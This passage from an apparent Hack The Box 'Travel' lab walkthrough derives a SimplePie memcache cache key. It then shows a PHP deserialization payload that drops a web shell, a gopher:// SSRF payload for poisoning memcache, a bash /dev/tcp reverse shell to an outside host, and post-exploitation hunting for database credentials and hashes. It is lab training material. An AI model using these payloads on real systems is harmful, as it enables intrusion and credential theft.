+ * @param string $location Location string (from SimplePie::$cache_location)
+ * @param string $name     Unique ID for the cache
+ * @param string $type     Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data
+ */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s1">'host'</span>   <span class="o">=&gt;</span> <span class="s1">'127.0.0.1'</span><span class="p">,</span>
+        <span class="s1">'port'</span>   <span class="o">=&gt;</span> <span class="mi">11211</span><span class="p">,</span>
+        <span class="s1">'extras'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">'timeout'</span> <span class="o">=&gt;</span> <span class="mi">3600</span><span class="p">,</span> <span class="c1">// one hour</span>
+            <span class="s1">'prefix'</span>  <span class="o">=&gt;</span> <span class="s1">'simplepie_'</span><span class="p">,</span>
+        <span class="p">),</span>
+    <span class="p">);</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">=</span> <span class="n">SimplePie_Misc</span><span class="o">::</span><span class="nb">array_merge_recursive</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">,</span> <span class="n">SimplePie_Cache</span><span class="o">::</span><span class="nb">parse_URL</span><span class="p">(</span><span class="nv">$location</span><span class="p">));</span>
+
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'extras'</span><span class="p">][</span><span class="s1">'prefix'</span><span class="p">]</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"</span><span class="nv">$name</span><span class="s2">:</span><span class="nv">$type</span><span class="s2">"</span><span class="p">);</span>
+
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Memcached</span><span class="p">();</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="o">-&gt;</span><span class="nf">addServer</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]);</span>
+<span class="p">}</span>    
+</pre></table></code></div></div><p>As per the above code the generated url should be something like:</p><p><code class="language-plaintext highlighter-rouge">127.0.0.1:11211/?timeout=3600&amp;prefix=simplepie_md5("$name:$type")</code></p><p>This co-relates with our source code as we have <code class="language-plaintext highlighter-rouge">timeout</code>as 60sec and prefix as <code class="language-plaintext highlighter-rouge">xct_</code>. So now we understand that the appending <code class="language-plaintext highlighter-rouge">4e5612ba07(...)</code> is an md5 hash and <code class="language-plaintext highlighter-rouge">name</code> is the Unique ID for the cache.</p><p>Looking at <a href="https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.php"><strong>base.php</strong></a> we found the following two lines through which we can confirm the value of <code class="language-plaintext highlighter-rouge">type</code> is <code class="language-plaintext highlighter-rouge">spc</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="k">const</span> <span class="no">TYPE_FEED</span> <span class="o">=</span> <span class="s1">'spc'</span><span class="p">;</span> <span class="c1">//Line 60</span>
+ <span class="o">*</span> <span class="o">@</span><span class="n">param</span> <span class="n">string</span> <span class="nv">$name</span> <span class="nc">Unique</span> <span class="no">ID</span> <span class="k">for</span> <span class="n">the</span> <span class="n">cache</span> <span class="c1">//Line 73</span>
+</pre></table></code></div></div><p>Based on all the information we have gathered so far the key is generated by concatenating the prefix and appending it with md5sum of <code class="language-plaintext highlighter-rouge">name(Unique ID):type</code>, combining all the results we get the key as:</p><ul><li><code class="language-plaintext highlighter-rouge">xct_ + md5(name:"spc")</code> where we are yet to figure out the <code class="language-plaintext highlighter-rouge">name</code> which is some Unique ID</li></ul><p>Looking at the following code from <a href="https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache.php"><strong>cache.php</strong></a>, here the function <code class="language-plaintext highlighter-rouge">get_handler</code> is calling location which is the url, file name is the Unique ID (name) and extension as <code class="language-plaintext highlighter-rouge">spc</code> which we determined as type.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="o">**</span>
+	 <span class="o">*</span> <span class="nc">Create</span> <span class="n">a</span> <span class="k">new</span> <span class="nc">SimplePie_Cache</span> <span class="n">object</span>
+	 <span class="o">*</span>
+	 <span class="o">*</span> <span class="o">@</span><span class="n">param</span> <span class="n">string</span> <span class="nv">$location</span> <span class="no">URL</span> <span class="nf">location</span> <span class="p">(</span><span class="n">scheme</span> <span class="n">is</span> <span class="n">used</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">handler</span><span class="p">)</span>
+	 <span class="o">*</span> <span class="o">@</span><span class="n">param</span> <span class="n">string</span> <span class="nv">$filename</span> <span class="nc">Unique</span> <span class="n">identifier</span> <span class="k">for</span> <span class="n">cache</span> <span class="n">object</span>
+	 <span class="o">*</span> <span class="o">@</span><span class="n">param</span> <span class="n">string</span> <span class="nv">$extension</span> <span class="s1">'spi'</span> <span class="k">or</span> <span class="s1">'spc'</span>
+	 <span class="o">*</span> <span class="o">@</span><span class="k">return</span> <span class="n">SimplePie_Cache_Base</span> <span class="nc">Type</span> <span class="n">of</span> <span class="n">object</span> <span class="n">depends</span> <span class="n">on</span> <span class="n">scheme</span> <span class="n">of</span> <span class="sb">`$location`</span>
+	 <span class="o">*/</span>
+	<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">get_handler</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$type</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+		<span class="nv">$type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">]))</span>
+		<span class="p">{</span>
+			<span class="nv">$class</span> <span class="o">=</span> <span class="k">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">];</span>
+			<span class="k">return</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="k">return</span> <span class="k">new</span> <span class="nc">SimplePie_Cache_File</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>Deep diving into <a href="https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php"><strong>Simplepie.php code</strong></a> to better insight on <code class="language-plaintext highlighter-rouge">name</code>, based on the lines from code understand how <code class="language-plaintext highlighter-rouge">get_handler</code> has been used here to get the inputs:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="s1">'Cache'</span><span class="p">,</span> <span class="s1">'get_handler'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_name_function</span><span class="p">,</span> <span class="nv">$url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">));</span> <span class="c1">//Line 1377</span>
+</pre></table></code></div></div><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="s1">'Cache'</span><span class="p">,</span> <span class="s1">'get_handler'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_name_function</span><span class="p">,</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">));</span> <span class="c1">//Line 1714</span>
+</pre></table></code></div></div><ul><li>location here is <code class="language-plaintext highlighter-rouge">memcache:127:0.0.1:11211</code></li><li>filename : <code class="language-plaintext highlighter-rouge">call_user_func($this-&gt;cache_name_function</code></li></ul><p>And its calling another function <code class="language-plaintext highlighter-rouge">cache_name_function</code> which is located at Lines 535-540 of Simplepie.php.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="cd">/**
+ * @var string Function that creates the cache filename
+ * @see SimplePie::set_cache_name_function()
+ * @access private
+ */</span>
+<span class="k">public</span> <span class="nv">$cache_name_function</span> <span class="o">=</span> <span class="s1">'md5'</span><span class="p">;</span>
+</pre></table></code></div></div><p>As per above code <code class="language-plaintext highlighter-rouge">cache_name_function</code> does md5 of <code class="language-plaintext highlighter-rouge">$this-&gt;cache_name_function, $file-&gt;url)</code> which means it does <code class="language-plaintext highlighter-rouge">md5($url)</code> and url is <code class="language-plaintext highlighter-rouge">feed_url</code> as per below line from the code:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">feed_url</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">force_feed</span> <span class="o">?</span> <span class="s1">'#force_feed'</span> <span class="o">:</span> <span class="s1">''</span><span class="p">);</span> <span class="c1">//Line 1376</span>
+</pre></table></code></div></div><p>Combining all our analysed data we conclude:</p><ul><li>The cache key is constructed like this: <code class="language-plaintext highlighter-rouge">"xct_"+ md5(md5($feed_url)+":"+"spc")</code></li></ul><p>So let’s just confirm our theory and get the full encoded cache key:</p><p>Here the feed_url should be the default feed url <code class="language-plaintext highlighter-rouge">http://www.travel.htb/newsfeed/customfeed.xml</code>.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ <span class="nb">echo</span> <span class="nt">-n</span> http://www.travel.htb/newsfeed/customfeed.xml | <span class="nb">md5sum
+</span>3903a76d1e6fef0d76e973a0561cbfc0  -
+
+cfx:  ~/Documents/htb/travel
+→ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"3903a76d1e6fef0d76e973a0561cbfc0:spc"</span> | <span class="nb">md5sum
+</span>4e5612ba079c530a6b1f148c0b352241  -
+</pre></table></code></div></div><p>Great ! Our hash matches with the first half of hash obtained while testing debug parameter.</p><ul><li>So the full cache key is <code class="language-plaintext highlighter-rouge">xct_4e5612ba079c530a6b1f148c0b352241</code></li></ul><h2 id="php-deserialization-attack">PHP deserialization attack</h2><p>As per our analysis we understand the default feed <code class="language-plaintext highlighter-rouge">customfeed.xml</code> contents gets converted into a PHP object, serialized and then stored into memcache database for 60 seconds so when the new user visits the RSS feed page, the page contents are pulled from memcache and object is deserialized.</p><p>Here we will drop our payload of PHP command shell as PHP object into the memcache which will get deserialized as soon as default rss feed is called and get stored inside /logs directory.</p><p>We’ll use the below attack scenario:</p><ul><li>Create a PHP serialized object using the <code class="language-plaintext highlighter-rouge">TemplateHelper</code> Class with simple PHP command shell.</li><li>Sending the Poisoned cache request via Gopher leveraging the <code class="language-plaintext highlighter-rouge">custom_feed_url</code> parameter</li><li>Call the default rss feed url <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/</code> to trigger the deserilization of cache within 60 sec.</li></ul><h3 id="php-serialized-object">PHP Serialized Object</h3><p>For creating a PHP serialized object, we will use <code class="language-plaintext highlighter-rouge">TemplateHelper class</code>, copy its contents to a new php file and add a line that creates the object, passing the filename and it’s content and echo the serialized output.</p><p>Initially when I declared <code class="language-plaintext highlighter-rouge">$file and $data</code> as <code class="language-plaintext highlighter-rouge">private</code> it didn’t work for me but after declaring them as <code class="language-plaintext highlighter-rouge">public</code> the below exploit worked for me.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+	<span class="c1">// Is called upon deserialization!</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="n">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+	    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/logs/'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplateHelper</span><span class="p">(</span><span class="s2">"cfx.php"</span><span class="p">,</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_REQUEST['cfx']); ?&gt;"</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>The PHP object produced by this code can be further used in Gopherus to generate our Gopher payload for memcache injection</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ php exploit.php
+O:14:<span class="s2">"TemplateHelper"</span>:2:<span class="o">{</span>s:4:<span class="s2">"file"</span><span class="p">;</span>s:7:<span class="s2">"cfx.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:34:<span class="s2">"&lt;?php system(</span><span class="nv">$_REQUEST</span><span class="s2">['cfx']); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
+</pre></table></code></div></div><h2 id="shell-as-www-data">Shell as www-data</h2><p>Passing the php payload into Gopherus:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ /opt/Gopherus/gopherus.py <span class="nt">--exploit</span> phpmemcache
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   <span class="se">\ </span> ___ /  _ <span class="se">\\</span>____ <span class="se">\|</span>  |  <span class="se">\_</span>/ __ <span class="se">\_</span>  __ <span class="se">\ </span> |  <span class="se">\/</span>  ___/
+<span class="se">\ </span>   <span class="se">\_\ </span> <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  |_&gt; <span class="o">&gt;</span>   Y  <span class="se">\ </span> ___/|  | <span class="se">\/</span>  |  /<span class="se">\_</span>__ <span class="se">\</span>
+ <span class="se">\_</span>_____  /<span class="se">\_</span>___/|   __/|___|  /<span class="se">\_</span>__  <span class="o">&gt;</span>__|  |____//____  <span class="o">&gt;</span>
+        <span class="se">\/</span>       |__|        <span class="se">\/</span>     <span class="se">\/</span>                 <span class="se">\/</span>
+
+                author: <span class="nv">$_SpyD3r_</span><span class="err">$</span>
+
+
+This is usable when you know Class and Variable name used by user
+
+Give serialization payload
+example: O:5:<span class="s2">"Hello"</span>:0:<span class="o">{}</span>   : O:14:<span class="s2">"TemplateHelper"</span>:2:<span class="o">{</span>s:4:<span class="s2">"file"</span><span class="p">;</span>s:7:<span class="s2">"cfx.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:34:<span class="s2">"&lt;?php system(</span><span class="nv">$_REQUEST</span><span class="s2">['cfx']); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
+
+Your gopher <span class="nb">link </span>is ready to <span class="k">do </span>SSRF :
+
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22cfx.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cfx%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+
+After everything <span class="k">done</span>, you can delete memcached item by using this payload:
+
+gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
+</pre></table></code></div></div><p>After replacing the default Gopherus key <code class="language-plaintext highlighter-rouge">SpyD3r</code> with our cache key <code class="language-plaintext highlighter-rouge">xct_4e5612ba079c530a6b1f148c0b352241</code> and <code class="language-plaintext highlighter-rouge">127.0.0.1</code> with <code class="language-plaintext highlighter-rouge">LOCALHOST</code> we have the following payload:</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="go">gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22cfx.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cfx%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</span></pre></table></code></div></div><p>Now we send our poisoned cache request to the server:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/burprev.png" alt="burprev" /></p><p>After sending the request, we can also check debug.php page to confirm if our serialized php object is cached:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ curl <span class="nt">-s</span> http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
+ ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+| xct_4e5612ba07<span class="o">(</span>...<span class="o">)</span> | O:14:<span class="s2">"TemplateHelper"</span>:2:<span class="o">{</span>s:4:<span class="s2">"file(...) |
+ ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></pre></table></code></div></div><p>Bingo ! we have our serialized object cached, Now we go to <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/</code> which will trigger the deserialization, after deserialization we have 60 seconds to test our RCE</p><p>Here we can confirm our command shell has been written inside logs directory and we have a working RCE:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ curl <span class="nt">-s</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cfx.php?cfx<span class="o">=</span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</pre></table></code></div></div><p>Now that we have code execution, let’s get a reverse shell using <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/8020 0&gt;&amp;1'</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/burprev1.png" alt="burprev1" /></p><h3 id="getting-a-call-back-on-nc-listener">Getting a call back on nc listener:</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ nc <span class="nt">-lvnp</span> 8020
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8020
+Ncat: Listening on 0.0.0.0:8020
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:56070.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</pre></table></code></div></div><h2 id="elevating-privilege-www-data---lynik-admin">Elevating privilege: www-data -&gt; lynik-admin</h2><h3 id="enumeration">Enumeration</h3><p>Looking at the interfaces and <code class="language-plaintext highlighter-rouge">.dockerenv</code> inside the root directory indicates we are inside a docker container</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre>www-data@blog:/<span class="nv">$ </span>ip addr
+ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+8: eth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+    <span class="nb">link</span>/ether 02:42:ac:1e:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.30.0.10/24 brd 172.30.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+www-data@blog:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 88
+drwxr-xr-x   1 root root 4096 Apr 23 18:44 <span class="nb">.</span>
+drwxr-xr-x   1 root root 4096 Apr 23 18:44 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root    0 Apr 23 18:44 .dockerenv
+drwxr-xr-x   1 root root 4096 Apr 13 13:05 bin
+drwxr-xr-x   2 root root 4096 Feb  1  2020 boot
+drwxr-xr-x   5 root root  340 Sep 20 13:58 dev
+drwxr-xr-x   1 root root 4096 Apr 23 18:44 etc
+drwxr-xr-x   2 root root 4096 Feb  1  2020 home
+drwxr-xr-x   1 root root 4096 Mar 31 18:17 lib
+drwxr-xr-x   2 root root 4096 Mar 27 00:00 lib64
+drwxr-xr-x   2 root root 4096 Mar 27 00:00 media
+drwxr-xr-x   2 root root 4096 Mar 27 00:00 mnt
+drwxr-xr-x   1 root root 4096 Apr 13 13:37 opt
+dr-xr-xr-x 187 root root    0 Sep 20 13:58 proc
+drwx------   1 root root 4096 Apr 23 19:00 root
+drwxr-xr-x   1 root root 4096 Apr 13 13:15 run
+drwxr-xr-x   1 root root 4096 Apr 13 13:05 sbin
+drwxr-xr-x   2 root root 4096 Mar 27 00:00 srv
+dr-xr-xr-x  13 root root    0 Sep 20 13:58 sys
+drwxrwxrwt   1 root root 4096 Sep 21 07:19 tmp
+drwxr-xr-x   1 root root 4096 Mar 27 00:00 usr
+drwxr-xr-x   1 root root 4096 Mar 31 18:10 var
+</pre></table></code></div></div><p>While further enumerating I found <code class="language-plaintext highlighter-rouge">wp</code> database credentials inside <code class="language-plaintext highlighter-rouge">/var/www/html/wp-config.php</code> but the hash discovered under<code class="language-plaintext highlighter-rouge">wp_users</code> didn’t crack with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist.</p><p>We also discover a SQL backup inside the <code class="language-plaintext highlighter-rouge">/opt/wordpress</code> directory:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>www-data@blog:/opt/wordpress<span class="nv">$ </span><span class="nb">ls
+ls
+</span>backup-13-04-2020.sql
+</pre></table></code></div></div><p>Looking at the database backup, at the bottom we found hashes for users, we can pipe the command with <code class="language-plaintext highlighter-rouge">tail</code> to display last 20 lines of the file:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>www-data@blog:/opt/wordpress<span class="nv">$ </span><span class="nb">cat </span>backup-13-04-2020.sql | <span class="nb">tail</span> <span class="nt">-n</span> 20
+<span class="nb">cat </span>backup-13-04-2020.sql | <span class="nb">tail</span> <span class="nt">-n</span> 20
+<span class="nt">--</span>
+<span class="nt">--</span> Dumping data <span class="k">for </span>table <span class="sb">`</span>wp_users<span class="sb">`</span>
+<span class="nt">--</span>
+
+LOCK TABLES <span class="sb">`</span>wp_users<span class="sb">`</span> WRITE<span class="p">;</span>
